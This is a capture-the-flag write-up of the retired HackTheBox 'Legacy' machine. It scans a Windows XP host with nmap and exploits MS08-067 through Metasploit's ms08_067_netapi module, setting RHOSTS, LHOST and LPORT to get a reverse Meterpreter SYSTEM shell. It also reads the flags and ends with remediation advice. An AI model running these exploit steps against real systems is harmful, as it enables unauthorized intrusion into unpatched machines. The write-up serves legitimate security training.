+++
title = "HackTheBox - Legacy Writeup"
date = "2026-03-31"
description = "Exploiting Windows XP via MS08-067 (CVE-2008-4250) SMB vulnerability"
tags = ["HackTheBox", "CTF", "Windows", "MS08-067", "CVE-2008-4250", "SMB", "Metasploit", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++
Machine Info
FieldDetailsMachineLegacyOSWindows XP SP3DifficultyEasyCategoryRetiredVulnerabilityMS08-067 (CVE-2008-4250)

Reconnaissance
Nmap Scan
Run a default script and version detection scan, saving output for later reference.
bashnmap -sC -sV -oN initial.txt 10.129.221.131
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

OS: Windows XP SP3
Key observations:

Port 445/tcp (SMB) is open
OS fingerprinted as Windows XP SP3
No authentication services (RDP, SSH) exposed — SMB is the primary attack surface


Vulnerability Scanning
Run Nmap's built-in SMB vulnerability scripts against port 445.
bashnmap --script=smb-vuln* 10.129.221.131
smb-vuln-ms08-067: VULNERABLE
CVE-2008-4250
The host is confirmed vulnerable to MS08-067. This vulnerability exists in the NetpwPathCanonicalize() function of netapi32.dll and allows a remote, unauthenticated attacker to execute arbitrary code with SYSTEM privileges.

Exploitation
Using Metasploit
Search for the module by CVE and load it.
bashmsfconsole
search cve:2008-4250
use exploit/windows/smb/ms08_067_netapi
show options
Configure the required options and run the exploit.
bashset RHOSTS 10.129.221.131
set LHOST 10.10.14.45
set LPORT 4445
run
A Meterpreter session opens with NT AUTHORITY\SYSTEM — no privilege escalation needed.

Flag Retrieval
bash# User flag
type "C:\Documents and Settings\john\Desktop\user.txt"

# Root flag
type "C:\Documents and Settings\Administrator\Desktop\root.txt"

Summary
StepTool / CommandPort scannmap -sC -sVVuln detectionnmap --script=smb-vuln*ExploitMetasploit ms08_067_netapiResultSYSTEM shell — no privesc required
Key Takeaways

MS08-067 is a pre-authentication RCE that grants immediate SYSTEM access with no credentials needed
Windows XP and Server 2003 without the KB958644 patch remain vulnerable
The attack path mirrors real-world intrusions against unpatched legacy systems still found in industrial and embedded environments

Remediation

Apply Microsoft patch KB958644
Disable SMBv1 if legacy protocol support is not required
Isolate legacy systems behind strict firewall rules, blocking inbound access to ports 139 and 445
